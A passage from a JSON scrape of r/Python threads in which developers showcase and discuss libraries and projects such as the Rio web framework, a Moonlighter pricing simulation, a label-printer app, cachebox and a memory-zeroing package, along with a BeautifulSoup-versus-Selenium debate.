            "content": "I looked at the getting started guide. The syntax does not seem Pythonic. It seems more Javascript inspired and reminds of tests I wrote in Postman. What made you choose to go with this style? If you create a client object, why is making the request not a method of the client object itself. More importantly, in your examples, the only thing the client object seems to be doing is to hold the base URL. So why can't I just pass the URL to the given() function? I do like how simple you've made setting cookies, auth headers, or even file uploads. Even as an abstraction layer over requests, this does look cool and easier to use.",
            "replies": [
                {
                    "author": "Eastern_Reporter_834",
                    "score": "1",
                    "content": "That’s right, the syntax is not Pythonic. It was done this way to make it as simple and as intuitive as possible for people who starting with Python (e.g. AQA engineers) to lower the entry barrier. The approach itself is similar to Java’s RestAssured framework that widely used for API tests. Regarding the client usage, yes, it takes a base url and in the same time it’s a container of all the parameters we are setting in method chaining. In the same time, it allow user to have a few distinct requests in one namespace. But it’s a good suggestion to pass the URL in the given method."
                }
            ]
        }
    ]
},
{
    "post_author": "Sn3llius",
    "post_id": "1d43uol",
    "post_score": "124",
    "post_time": "Thursday, May 30, 2024 at 4:19:04 PM GMT+3",
    "flair_text": "Invalid Showcase",
    "post_title": "Rio: WebApps in pure Python – Thanks and Feedback wanted!",
    "media": [
        "https://github.com/rio-labs/rio"
    ],
    "post_content": "Hey everyone,\nI'm a Rio developer, and I just wanted to say thanks for all the feedback we've received so far! Since our launch, we've implemented a lot of the features you asked for!\nAs requested, we are currently working on an in-depth technical description of Rio, explaining how it works under the hood. So stay tuned!\nWe are looking forward to your feedback, so let us hear from you! :)\nGitHub",
    "comments": [
        {
            "author": "riklaunim",
            "score": "44",
            "content": "I would want to see a functional example of a dashboard like Metronic or something similar - not just one sub page but something slightly bigger with global state management and something like: a list of projects, you click in, you get project details and can switch between tabs listing project issues, project team members etc - nested routes, CRUD."
        },
        {
            "author": "Ran4",
            "score": "16",
            "content": "The first question most people are going to have is how the server-client syncing happens - there really should be a section in the README talking about that. I would suggest that the default example should have autoreloading too."
        },
        {
            "author": "Cybersoaker",
            "score": "11",
            "content": "First off this is awesome! Love not having to deal with JS lol Do you have plans for more generic support for custom styles, not just colors but full theming? (Personally I despise material design and would love to override it) One approach to this I really like is \"design tokens\" common in pure web components. Here's an example https://shoelace.style/tokens/typography I'm imagining a sort of generic implementation for the built in components that can be styled using these design tokens in a theme file."
        },
        {
            "author": "jackshec",
            "score": "10",
            "content": "I would love to see a user management and auth example",
            "replies": [
                {
                    "author": "Sn3llius",
                    "score": "8",
                    "content": "sure, we will add one to our examples in the near future :)"
                }
            ]
        },
        {
            "author": "Zulfiqaar",
            "score": "7",
            "content": "Nice! Any key differences and advantages compared to reflex? https://reflex.dev/",
            "replies": [
                {
                    "author": "P4nd4no",
                    "score": "11",
                    "content": "Hey, rio dev here. Reflex use react, but they aren't react. This is something I've noticed with several libraries. While they might internally utilize react or flutter or whatnot, the interface they provide to you, the developer is radically different. React's big innovation was that you can write regular code to build user interfaces: Only want to display a component some of the time? use an if. Got multiple items to display? Just append in a loop. But you won't see any of that when you're actually making an app with reflex. Your code instead has to statically return a fixed UI, and if you want to modify it you gotta do it with pre-added conditional rendering components. When we say Rio is react style, we mean it. We're bringing the same development model to Python, that has taken over apps by storm. There's a lot more limitations too. Rio supports state in each component, rather than a global god class that always ends up bloated. We don't refresh everything, but only the components that have changed. We support arbitrary Python functions as event handlers, rather than just methods in the state class. Because build is actual Python, you can use logic for parameters, instead of just binding attributes... I don't wanna turn too negative. I'm glad reflex exists, and it's been a major motivation for improving Rio. But I really don't think we're even in the same ballpark when it comes to advanced apps"
                }
            ]
        },
        {
            "author": "divad1196",
            "score": "6",
            "content": "I found Rio a while ago, a bit after finding Reactpy. What are the advantages over Reactpy? My current issues are: speed still everything need to be coded. (More on that below) I want to have a list/form/search/... views based on my model information (using introspection on my models) NOTE: my models contains metadata for access permission and other stuffs. So I wrote something to generate the views on thr fly. This works, but this is not that great.",
            "replies": [
                {
                    "author": "Rawing7",
                    "score": "10",
                    "content": "Hello, rio dev here. Reactpy seems to be a rather direct translation of reactjs in python, which means it requires a lot of knowledge about HTML and CSS. Rio on the other hand has been designed for python from the ground up: It doesn't require any HTML, CSS or JS knowledge at all. Python allows nicer syntax than JS for certain things. For example, Rio components are pretty much normal classes, whereas react(py) requires you to familiarize yourself with new concepts like value, set_value = hooks.use_state(\"\"). Thanks to Rio's type annotations, your IDE can support you much better compared to reactpy where everything takes a dictionary as input. As for automatically creating views for a model, we completely agree that this would be nice to have. We've already experimented with it a little bit, but the results aren't quite production-ready yet. It's definitely something we have on our radar, though!"
                }
            ]
        },
        {
            "author": "ttrav71",
            "score": "6",
            "content": "Awesome work, I'd love to contribute to this, keep it up."
        }
    ]
},
{
    "post_author": "JaggedParadigm",
    "post_id": "1d8uex2",
    "post_score": "9",
    "post_time": "Wednesday, June 5, 2024 at 7:38:51 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Bayesian bandits item pricing in a simplified Moonlighter shop simulation using Python and SQLite",
    "media": [
        "https://cmshymansky.com/MoonlighterBayesianBanditsPricing/?source=rPython",
        "https://github.com/JaggedParadigm/moonlighter_bayesian_bandit_pricing"
    ],
    "post_content": "What My Project Does:\nMoonlighter is a game that includes a mechanic where you place items on shelves in your store and set the price. Customer's reactions give you hints about what prices would be ideal. These reactions take the form of four moods:\necstatic: price too low so they are extra happy\ncontent: price is what they were expecting,\nsad: price is too high to them but they buy anyway and this lowers the price everyone will pay for a certain period\nangry: price is too high so they don't buy\nI built a simplified version where a sad reaction doesn't lower the prices customers will accept for that item using Python and SQLite.\nThe Bayesian bandits algorithm is an algorithm to optimize rewards when choosing among different options. The probability of different rewards (e.g. revenue) is kept track of and updated as rewards for options are collected. When a new option is to be selected a competition occurs where the rewards are sampled from these probability distributions and the option with the highest reward is chosen.\nFor this simulation, the reward distributions are the probability that a price is the ideal price for that item. This scenario is so simple that the probability of any particular ideal price is flat or the same for all prices between an upper and lower bound and zero outside. This makes item/price selection simply randomly selecting a price from the lower to upper bounds for every item and selecting the item with the highest price.\nCustomer reaction moods update the item upper/lower price bounds in these ways:\necstatic or content: lower bound is set to price plus 1 gold\nsad: lower bound is set to price if upper and lower bounds don't match\nangry: upper bound set to price minus 1 gold if the upper and lower bounds don't match\nThe SQLite database keeps track of items in your inventory, items on shelves, customer reactions, item price bounds, and Thompson competitions (i.e. prices randomly chosen between price bounds for each item).\nThe algorithm ended up identifying groups of items with the same ideal prices and selling them off from highest to lowest.\nFor the full write up and a lot of pretty graphs check out the article in the link below. I've also included the Github link for those that want to see the full implementation and/or a Jupyter notebook where I generate the plots.\nFull write-up: https://cmshymansky.com/MoonlighterBayesianBanditsPricing/?source=rPython\nGithub: https://github.com/JaggedParadigm/moonlighter_bayesian_bandit_pricing\nTarget Audience:\nThis a toy, though the Thompson sampling code could be hacked into something useful.\nComparison:\nTo my knowledge, I am the first to apply the Bayesian bandits algorithm to a Moonlighter shop simulation. However, pricing via Bayesian bandits is a classic application and there are many blogs and scientific papers on the topic.",
    "comments": [
        {
            "author": "mechamotoman",
            "score": "2",
            "content": "So cool! How do you interface with the game to get the data out? Or is it just manual data entry?",
            "replies": [
                {
                    "author": "JaggedParadigm",
                    "score": "1",
                    "content": "Thanks! I manually entered the bounds found in the ledger for an initial group of items I obtained and the price bounds from the wiki that define customer reactions. I did investigate making a mod for the game, which would streamline a lot of this. It seems possible but I would need to learn C#. I don't think I have quite the appetite for that."
                }
            ]
        }
    ]
},
{
    "post_author": "good-guy-coder",
    "post_id": "1d5lkew",
    "post_score": "8",
    "post_time": "Saturday, June 1, 2024 at 3:09:06 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "NiimPrintX: A desktop app for NiimBot Label Printers developed in Python",
    "media": [
        "https://github.com/labbots/NiimPrintX"
    ],
    "post_content": "I'm super excited to share NiimPrintX, a desktop app I've been working on for NiimBot label printers. This is my first release, and I am actively working on adding new functionalities.\nWhat My Project Does:\nNiimPrintX offers both a command line and graphical user interface app to connect with your NiimBot printer. It connects via Bluetooth and makes label printing a breeze. The app is developed completely using Python 3.12 and the Tkinter library for the GUI.\nGitHub Repository: NiimPrintX\nTarget Audience:\nThis project is aimed at hobbyists who use NiimBot label printers. It's a proof of concept project for me to learn GUI app development in Python.\nComparison:\nCurrently, there is no desktop app support for NiimBot thermal label printers. Only the official Android/iOS app is available, and it has limited functionality without a paid subscription. NiimPrintX aims to fill this gap by providing a free, more versatile desktop solution.\nSupported Printer Models:\nD11/B21/B1\nD110\nB18\nCool Features:\nBluetooth Auto Discovery: Automatically finds your printer using its model name.\nEasy Label Design: Create labels with a simple and intuitive GUI.\nPredefined Icons: Spice up your labels with built-in icons.\nCross-Platform: Works on Mac, Windows, and Linux.\nAdvanced Print Options: Includes calibration features for perfect prints.\nComing Soon:\nBarcode Creation: Make your own barcodes right in the app.\nQR Code Printing: Generate and print QR codes.\nBetter Object Alignment: More shapes and borders for your designs.\nI'm constantly working on adding new features, so keep an eye out for updates!\nCheck out the GitHub repo for more info and installation instructions: NiimPrintX\nI'd love to hear what you think! Drop a comment or open an issue on GitHub with any feedback or suggestions.",
    "comments": []
},
{
    "post_author": "Kurisuchina",
    "post_id": "ndozrt",
    "post_score": "2724",
    "post_time": "Sunday, May 16, 2021 at 5:03:14 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Why would you want to use BeautifulSoup instead of Selenium?",
    "media": [],
    "post_content": "I was wondering if there is a scenario where you would actually need BeautifulSoup. IMHO you can do with Selenium as much and even more than with BS, and Selenium is easier, at least for me. But if people use it there must be a reason, right?",
    "comments": [
        {
            "author": "james_pic",
            "score": "698",
            "content": "BeautifulSoup is faster and uses less memory than Selenium. It doesn't execute JavaScript, or do anything other than parse HTML and work with its DOM. If you're just using it for test automation then the only reason to use anything but Selenium is if you need to for performance reasons (e.g, you're running volume tests, and Selenium won't scale that far). If you're web scraping for some other reason, then just use what works for you. If you need a HTML parser because you need to work with HTML programmatically (maybe you're generating HTML, or you're working with HTML-based templates, or you're handling rich text), then use BeautifulSoup.",
            "replies": [
                {
                    "author": "schedutron",
                    "score": "52",
                    "content": "To take a step further, I often use lxml package’s etree with element XPath’s. I believe it’s even faster because it’s a lower level library relative to bs4.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "31",
                            "content": "Lxml is fast as hell. I used it to parse some pretty complicated files and update them with values as well. Of course they were pure xml, not web webscraping",
                            "replies": [
                                {
                                    "author": "Zomunieo",
                                    "score": "9",
                                    "content": "Lxml is also unsafe as hell - it is vulnerable to several XML exploits in its default configuration and needs to be carefully locked down."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "enricojr",
            "score": "87",
            "content": "For web scraping? Selenium was designed to automate web browsers for the purpose of testing web pages, and it just so happens to be able to scrape web page content. BeautifulSoup is a library for parsing XML/HTML. I am presently using BeautifulSoup in one of my projects to parse podcast RSS feeds (which are XML files). The big bottleneck with Selenium with respect to web scraping is that it can only fetch one page at time - something like BeautifulSoup could probably be combined with an async HTTP library like aiohttp to download multiple pages at once and scrape them for links / data. (realistically you should probably just use something like Scrapy of you're looking to scrape a lot of data)"
        },
        {
            "author": "applepie93",
            "score": "175",
            "content": "BeautifulSoup is for (X)HTML parsing and building, whereas Selenium is made for end-to-end testing. Selenium launches a browser and can be controlled to interact with the UI. That's the main goal of the tool. If you only want to parse web pages without interacting with them, you would probably use requests with or without beautifulsoup. TL;DR: Both packages serve different purposes, even though you can use selenium just to parse a web page."
        },
        {
            "author": "zoro_moulan",
            "score": "27",
            "content": "I usually use a combination of both for web scraping like for instance regulary checking a website content. The reason I use selenium is because it handles login and navigation really good and once I get to the pages I want, I parse them with BeautifulSoup"
        }
    ]
},
{
    "post_author": "monorepo",
    "post_id": "1d4nvou",
    "post_score": "6",
    "post_time": "Friday, May 31, 2024 at 8:09:18 AM GMT+3",
    "flair_text": "Meta",
    "post_title": "2024 StackOverflow Survey",
    "media": [
        "https://stackoverflow.az1.qualtrics.com/jfe/form/SV_6rJVT6XXsfTo1JI"
    ],
    "post_content": "This years SO survey is out now. It includes questions for Python tooling and frameworks. Contribute when you can, it closes soon. It takes ~10 minutes to finish.\nLink to the survey: https://stackoverflow.az1.qualtrics.com/jfe/form/SV_6rJVT6XXsfTo1JI",
    "comments": [
        {
            "author": "nerdy-engineer12",
            "score": "4",
            "content": "Feels like open ai's survey instead"
        },
        {
            "author": "SittingWave",
            "score": "9",
            "content": "As far as I am concerned, SO, all its corporate backing and all its community can fuck right off.",
            "replies": [
                {
                    "author": "rghthndsd",
                    "score": "2",
                    "content": "Curious what is driving this comment. As far as I'm concerned, all I've ever given them is internet traffic, and in turn they've helped me and my team on a daily basis. Seems like a win to me."
                }
            ]
        },
        {
            "author": "davemoedee",
            "score": "2",
            "content": "I feel bad for Stack Overflow. At least Copilot includes links while eating SO’s lunch."
        },
        {
            "author": "aaelsay3d",
            "score": "2",
            "content": "This is my first time filling out this survey. When will the results be out?"
        }
    ]
},
{
    "post_author": "LAcuber",
    "post_id": "hei6kg",
    "post_score": "2393",
    "post_time": "Tuesday, June 23, 2020 at 7:49:50 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Wrote a script that downloads r/wallpaper's hottest 100 images and cycles through them as a wallpaper!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "unleashedbacon",
            "score": "63",
            "content": "I’m looking for a personal project to keep testing my skills, can you list the tools you used to do this?",
            "replies": [
                {
                    "author": "LAcuber",
                    "score": "106",
                    "content": "Sure. These are the libraries that I used: urllib praw BeautifulSoup requests sys UPDATE: GitHub repo is available! https://github.com/Destaq/reddit-wallpapers",
                    "replies": [
                        {
                            "author": "michael8t6",
                            "score": "27",
                            "content": "Curious how was you able to scrape reddit with requests? I recently wanted to scrape a collection of subreddits and every request responded with either 404 or 502. Tried spoofing my useragent and still had the same results!"
                        },
                        {
                            "author": "Bored_comedy",
                            "score": "4",
                            "content": ""
                        },
                        {
                            "author": "unleashedbacon",
                            "score": "2",
                            "content": ""
                        },
                        {
                            "author": "angk500",
                            "score": "3",
                            "content": ""
                        },
                        {
                            "author": "_seelos",
                            "score": "1",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "shefpuff",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "_Red-Riot_",
            "score": "65",
            "content": ""
        },
        {
            "author": "Sanguineyote",
            "score": "19",
            "content": "Could you release the code?"
        },
        {
            "author": "impshum",
            "score": "20",
            "content": "Cool. I done something similar but with NASA picture of the day: https://github.com/impshum/NPOTD"
        },
        {
            "author": "LAcuber",
            "score": "6",
            "content": "Update: GitHub repo ready with full instructions, code, and images! https://github.com/Destaq/reddit-wallpapers"
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "I just discovered r/Wallpapers 😊😊"
        },
        {
            "author": "Throatybee",
            "score": "6",
            "content": "i hope one day i m gonna write a script like this :) nice job!!!"
        },
        {
            "author": "seeyainvalhalla",
            "score": "3",
            "content": "Thats awesome"
        },
        {
            "author": "choledocholithiasis_",
            "score": "3",
            "content": "Doesn’t that sub have occasional NSFW content? Wouldn’t try this on a work computer. Nice project tho m8"
        }
    ]
},
{
    "post_author": "radumarias",
    "post_id": "1d620fk",
    "post_score": "0",
    "post_time": "Sunday, June 2, 2024 at 4:21:27 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "zeroize: Securely clear secrets from memory",
    "media": [
        "https://github.com/radumarias/zeroize-python"
    ],
    "post_content": "https://github.com/radumarias/zeroize-python\nWhat My Project Does: Clear secrets from memory. Built on stable Rust primitives which guarantee memory is zeroed using an operation will not be 'optimized away' by the compiler.\nTarget Audience it can be used in production, it's just a simple wrapper over zeroize crate from Rust\nComparison Personally I didn't found an easy and safe solution in Python to do this, hence I created this lib",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "megamorf",
            "score": "54",
            "content": "OP has repeatedly advertised his various security related packages in multiple subreddits, e.g. https://www.reddit.com/r/Python/comments/1d628t4/a_blend_of_rust_and_python_a_faster_encryption/ Several of them have been removed by the moderators. As I pointed out on the post above - everyone that is not a cryptography expert should live by \"never roll your own crypto\". I'd rather use a slower standard library version that constantly has to undergo scrutiny or at least one from one of the big players (e.g. Google) instead of using a community library that promises more speed at the cost of potentially compromising my entire product/environment."
        },
        {
            "author": "amarao_san",
            "score": "22",
            "content": "I was impressed by presence of the whole ONE test. It really proves that your code can handle different situations with indifference.",
            "replies": [
                {
                    "author": "radumarias",
                    "score": "-13",
                    "content": ""
                }
            ]
        },
        {
            "author": "monorepo",
            "score": "16",
            "content": "Hi there, from the r/Python mods. We want to emphasize that while security-centric programs are fun project spaces to explore we do not recommend that they be treated as a security solution unless they’ve been audited by a third party, security professional and the audit is visible for review. Security is not easy. And making project to learn how to manage it is a great idea to learn about the complexity of this world. That said, there’s a difference between exploring and learning about a topic space, and trusting that a product is secure for sensitive materials in the face of adversaries. We hope you enjoy projects like these from a safety conscious perspective. Warm regards and all the best for your future Pythoneering, r/Python moderator team"
        },
        {
            "author": "PossibilityTasty",
            "score": "18",
            "content": "Can you please elaborate how this guarantees that the given object's memory is overwritten, taking the various memory managing features of a modern OS into account? The first thing that popped into my mind: how is it going to handle a copy-on-write fork? My expectations would be that it will remap the memory, where the original area is masked for the process but still exists (without being zeroed).",
            "replies": [
                {
                    "author": "radumarias",
                    "score": "-3",
                    "content": "https://pandas.pydata.org/docs/dev/user_guide/copy_on_write.html As I understand copy on write happens when one of the variables that shares the same actual memory get changed. In that case, as you already made a \"copy\" to another variable you should zeroize both of them Another can be the problem, if the runtime moves the memory like described here https://docs.rs/zeroize/latest/zeroize/#stackheap-zeroing-notes For that in rust there is Pin which ensures the memory of that var is not moved, that is handled in secrecy crate https://crates.io/crates/secrecy and https://crates.io/crates/secrets , maybe a similar wrapper library for that would make sense also It is mostly an ergonomic wrapper around the memory-protection utilities provided by libsodium. Fixed-size buffers allocated on the stack gain the following protections: mlock(2) is called on the underlying memory the underlying memory is zeroed out when no longer in use they are borrowed for their entire lifespan, so cannot be moved they are compared in constant time they are prevented from being printed by Debug they are prevented from being Cloned"
                },
                {
                    "author": "radumarias",
                    "score": "-4",
                    "content": "you can see here more details from the lib that is used underneath https://docs.rs/zeroize/latest/zeroize/"
                }
            ]
        }
    ]
},
{
    "post_author": "JaggedParadigm",
    "post_id": "1d8uex2",
    "post_score": "9",
    "post_time": "Wednesday, June 5, 2024 at 7:38:51 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Bayesian bandits item pricing in a simplified Moonlighter shop simulation using Python and SQLite",
    "media": [
        "https://cmshymansky.com/MoonlighterBayesianBanditsPricing/?source=rPython",
        "https://github.com/JaggedParadigm/moonlighter_bayesian_bandit_pricing"
    ],
    "post_content": "What My Project Does:\nMoonlighter is a game that includes a mechanic where you place items on shelves in your store and set the price. Customer's reactions give you hints about what prices would be ideal. These reactions take the form of four moods:\necstatic: price too low so they are extra happy\ncontent: price is what they were expecting,\nsad: price is too high to them but they buy anyway and this lowers the price everyone will pay for a certain period\nangry: price is too high so they don't buy\nI built a simplified version where a sad reaction doesn't lower the prices customers will accept for that item using Python and SQLite.\nThe Bayesian bandits algorithm is an algorithm to optimize rewards when choosing among different options. The probability of different rewards (e.g. revenue) is kept track of and updated as rewards for options are collected. When a new option is to be selected a competition occurs where the rewards are sampled from these probability distributions and the option with the highest reward is chosen.\nFor this simulation, the reward distributions are the probability that a price is the ideal price for that item. This scenario is so simple that the probability of any particular ideal price is flat or the same for all prices between an upper and lower bound and zero outside. This makes item/price selection simply randomly selecting a price from the lower to upper bounds for every item and selecting the item with the highest price.\nCustomer reaction moods update the item upper/lower price bounds in these ways:\necstatic or content: lower bound is set to price plus 1 gold\nsad: lower bound is set to price if upper and lower bounds don't match\nangry: upper bound set to price minus 1 gold if the upper and lower bounds don't match\nThe SQLite database keeps track of items in your inventory, items on shelves, customer reactions, item price bounds, and Thompson competitions (i.e. prices randomly chosen between price bounds for each item).\nThe algorithm ended up identifying groups of items with the same ideal prices and selling them off from highest to lowest.\nFor the full write up and a lot of pretty graphs check out the article in the link below. I've also included the Github link for those that want to see the full implementation and/or a Jupyter notebook where I generate the plots.\nFull write-up: https://cmshymansky.com/MoonlighterBayesianBanditsPricing/?source=rPython\nGithub: https://github.com/JaggedParadigm/moonlighter_bayesian_bandit_pricing\nTarget Audience:\nThis a toy, though the Thompson sampling code could be hacked into something useful.\nComparison:\nTo my knowledge, I am the first to apply the Bayesian bandits algorithm to a Moonlighter shop simulation. However, pricing via Bayesian bandits is a classic application and there are many blogs and scientific papers on the topic.",
    "comments": [
        {
            "author": "mechamotoman",
            "score": "2",
            "content": "So cool! How do you interface with the game to get the data out? Or is it just manual data entry?",
            "replies": [
                {
                    "author": "JaggedParadigm",
                    "score": "1",
                    "content": "Thanks! I manually entered the bounds found in the ledger for an initial group of items I obtained and the price bounds from the wiki that define customer reactions. I did investigate making a mod for the game, which would streamline a lot of this. It seems possible but I would need to learn C#. I don't think I have quite the appetite for that."
                }
            ]
        }
    ]
},
{
    "post_author": "maurinhoandre",
    "post_id": "1d7mhrr",
    "post_score": "8",
    "post_time": "Tuesday, June 4, 2024 at 5:31:39 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PyODMongo an ODM for MongoDB",
    "media": [
        "https://pypi.org/project/pyodmongo/",
        "https://github.com/mauro-andre/pyodmongo"
    ],
    "post_content": "What My Project Does: PyODMongo is a modern Python library that serves as a robust Object-Document Mapper (ODM) and seamlessly bridges the gap between Python and MongoDB. It offers an intuitive and efficient way to interact with documents.\nBuilt on top of Pydantic V2, PyODMongo ensures that documents in the database rigorously represent the structure of Python objects. This means that documents are saved and retrieved from the database exactly as a Python object is structured, regardless of how nested the objects are and whether they are stored persistently or by reference. PyODMongo can automatically populate these documents.\nTarget Audience: Backend developers who want a simple and efficient way to work with MongoDB\nComparison: ODMantic ODM\nGitHub repository PyPi",
    "comments": [
        {
            "author": "WickedWicky",
            "score": "3",
            "content": "Awesome! I love the combination of Pydantic and Mongo, it's something I also use a lot but not with a dedicated package for it. I wonder though, why has the Field been redefined here: https://github.com/mauro-andre/pyodmongo/blob/master/pyodmongo/models/fields.py ? This is mostly the Field object from Pydantic, but I don't see where it differs. Also, I enjoy learning packages like this by going through the source code and building documentation for it. Would you be open to a PR that adds a readthedocs-type documentation page, with Sphinx and Github Pages?",
            "replies": [
                {
                    "author": "WickedWicky",
                    "score": "3",
                    "content": "Oh, I just found you already have documentation https://pyodmongo.dev/ which already looks great! Nice job"
                },
                {
                    "author": "maurinhoandre",
                    "score": "2",
                    "content": "Hi. In fact I simplified the Field function. I simply inject the indexes creation parameters index, unique, text_index and default_language. As for documentation, I would be very happy for your collaboration, I already use mkdocs. https://pyodmongo.dev/"
                }
            ]
        }
    ]
},
{
    "post_author": "sn1pr0s",
    "post_id": "l4kpou",
    "post_score": "2383",
    "post_time": "Monday, January 25, 2021 at 12:49:52 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "My startup failed, so I open sourced the code. I hope someone finds it useful.",
    "media": [
        "https://external-preview.redd.it/e7A15IkXhrWxlpJ7T_K3GGeBX2H1mNNSPjqAOmdrQhs.jpg?width=640&crop=smart&auto=webp&s=97b8591c7fde3a1f7d47add97c9201c84b3d8262",
        "https://github.com/AdamGold/Dryvo"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "rubenlie",
            "score": "136",
            "content": "",
            "replies": [
                {
                    "author": "Top_Lime1820",
                    "score": "52",
                    "content": ""
                }
            ]
        },
        {
            "author": "avamk",
            "score": "54",
            "content": "Thank you very much for doing this, I wish others would do the same in this situation. However, please include a LICENSE in your repository (such as GNU APLv3, GitHub makes choosing and adding a license very easy), otherwise it is only \"source available\" but not open source."
        }
    ]
},
{
    "post_author": "swallowedlava",
    "post_id": "g7q2ej",
    "post_score": "2687",
    "post_time": "Saturday, April 25, 2020 at 11:20:52 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "My pothole detector. Used yolov3 annotated images on labelimg.",
    "media": [
        "https://i.redd.it/rnpdy79kbxu41.jpg",
        "https://preview.redd.it/rnpdy79kbxu41.jpg?width=640&crop=smart&auto=webp&s=9f7d8c35cc814741c3903f78802838f800e779e4"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "209",
            "content": "Any chance you could share code? Or concept? I think this could be a very useful tool to mix with drone surveying and pothole identification/resolution.",
            "replies": [
                {
                    "author": "rrrrrrrrrrrreeeeeeee",
                    "score": "81",
                    "content": "I don't think finding the potholes is a problem. People complain about them to towns endlessly.",
                    "replies": [
                        {
                            "author": "dparks71",
                            "score": "50",
                            "content": "It's knowing which pothole they're complaining about that's the problem. I'm sure people call in all the time to let people know \"there's a pothole on I-81\". Great, thanks for narrowing down the search haha. It's actually pretty hard to effectively communicate where it is, unless it happens to be in a unique location (near a mp or easily identifiable point. This could help a lot on a drone if it records GPS locations in the photos."
                        },
                        {
                            "author": "ADeepCeruleanBlue",
                            "score": "24",
                            "content": "I always had the idea to run something like this on garbage trucks so they could be cataloged without additional effort on the part of the city since they hit every road anyways. Upload when they get in range of the truck depot and update a central map at public works."
                        }
                    ]
                },
                {
                    "author": "hrshopyredjoes",
                    "score": "18",
                    "content": "Sorry, meant to reply to your comment and accidentally replied to the guy below you."
                },
                {
                    "author": "swallowedlava",
                    "score": "13",
                    "content": "Sure thing! My code is on GitHub but I am guessing that its a private repo(I'll share it soon). But I largely had help from this medium article: https://medium.com/@today.rafi/train-your-own-tiny-yolo-v3-on-google-colaboratory-with-the-custom-dataset-2e35db02bf8f These people are the real heroes"
                },
                {
                    "author": "TraditionalSir7",
                    "score": "4",
                    "content": "This combination would be amazing for reporting rides that need maintenance."
                },
                {
                    "author": "bunby_heli",
                    "score": "4",
                    "content": "Nice try, Elon Musk"
                },
                {
                    "author": "The_Evilgenius",
                    "score": "3",
                    "content": "As someone who had to something similar (using drones to find holes in the ground) the hard part is not detecting the holes, it's geo rectifying the detections on a map that takes the most work. Drone imagery (without an rtk system) can be off by meters in many directions, and the process of correcting that imagery relies on either ground control points or an already corrected map of the area. For large scale deployment neither of those are great options as you either need to create detailed surveyed maps of an area in advance (time consuming and impractical) or have humans manually correct the images (operators need to have an understanding of the area and usually need some sort of background map). So while what OP has done here is fantastic work, turning it into a large scale system is an entirely different ballgame."
                }
            ]
        },
        {
            "author": "WongGendheng",
            "score": "77",
            "content": "Whats the detection rate when there is no water in the potholes?"
        },
        {
            "author": "EddyBot",
            "score": "68",
            "content": "https://screenshot.help/"
        },
        {
            "author": "jmf__",
            "score": "10",
            "content": "That’s brilliant. I deliver newspapers and I swear some people live on the moon"
        },
        {
            "author": "DazedWithCoffee",
            "score": "8",
            "content": "Add that to a HUD for cyclists, you’ve got a product there"
        },
        {
            "author": "nullpassword",
            "score": "7",
            "content": "Does it only detect ones with puddles?"
        },
        {
            "author": "h1pn0t04d",
            "score": "3",
            "content": "Awesome work."
        }
    ]
},
{
    "post_author": "SpareRevolution1487",
    "post_id": "1d45x7f",
    "post_score": "48",
    "post_time": "Thursday, May 30, 2024 at 5:53:09 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "cachebox: The fastest caching library written in Rust",
    "media": [
        "https://github.com/awolverp/cachebox-benchmark",
        "https://github.com/awolverp/cachebox"
    ],
    "post_content": "What my library does\nYou can easily and powerfully perform caching and memoizing operations in your Python projects using my library. This library is written in Rust, which makes its performance very fast and efficient. By using this library, you can use 7 different caching algorithms that allow you to choose the best algorithm based on your needs.\nOne prominent feature of this library is its simplicity to work with. You just need to import the library into your project and then behave with it like a dictionary.\nTherefore, if you are looking for a powerful, fast, and simple library for caching and memoizing in Python, my library will be responsive to your needs. By using this library, you can improve the performance of your program and significantly reduce the execution time of your Python code.\nTarget Audience\nFor anyone who needs caching and values speed\nComparison\nWhen compared to other caching libraries:\nIt's very faster than others (about 5-20x)\nIt's very simple and easy to use\nIt's completely thread-safe (uses RwLock)\nIt uses lower memory than others\nYou can see benchmark here: https://github.com/awolverp/cachebox-benchmark\nMore Info\nMy project github: https://github.com/awolverp/cachebox",
    "comments": [
        {
            "author": "christopher_86",
            "score": "33",
            "content": "Out of curiosity: what’s the benefit of using Rust here? I thought that in caching only time cost comes from saving to memory and maybe altering current state of cache a little bit, how is translating Python objects to Rust and then back to Python faster than pure Python implementation?",
            "replies": [
                {
                    "author": "AustinWitherspoon",
                    "score": "36",
                    "content": "Looking at the benchmarks they linked to, it does look universally faster than cachetools, which is the same thing but written in Python. But both are pretty fast- we're talking about a few microseconds difference in execution time. Optimizing database queries for example will make a way bigger difference than changing your caching library. But it's still cool to see people working so hard to optimize things!"
                }
            ]
        },
        {
            "author": "Grouchy-Friend4235",
            "score": "6",
            "content": "Can it cache live objects, eg database connections? cache tools does that for example",
            "replies": [
                {
                    "author": "SpareRevolution1487",
                    "score": "3",
                    "content": "Yes it can"
                }
            ]
        },
        {
            "author": "riksi",
            "score": "4",
            "content": "Have you seen https://github.com/Yiling-J/theine ? It's in rust too.",
            "replies": [
                {
                    "author": "SpareRevolution1487",
                    "score": "7",
                    "content": "I hadn't see it before. Unlike cachebox, this library isn't thread-safe. i will add it to benchmarks."
                }
            ]
        },
        {
            "author": "nderstand2grow",
            "score": "2",
            "content": "man i wish python was at least as far as Go...",
            "replies": [
                {
                    "author": "ryukinix",
                    "score": "7",
                    "content": "That's a lot. Even if python was as fast as Java we would be good. speed of languages",
                    "replies": [
                        {
                            "author": "Rhoomba",
                            "score": "1",
                            "content": "That is a misleading benchmark. Java is typically as fast or faster than Go. https://benchmarksgame-team.pages.debian.net/benchmarksgame/index.html",
                            "replies": [
                                {
                                    "author": "ryukinix",
                                    "score": "2",
                                    "content": "Every benchmark has bias. The one you pointed out has too."
                                }
                            ]
                        }
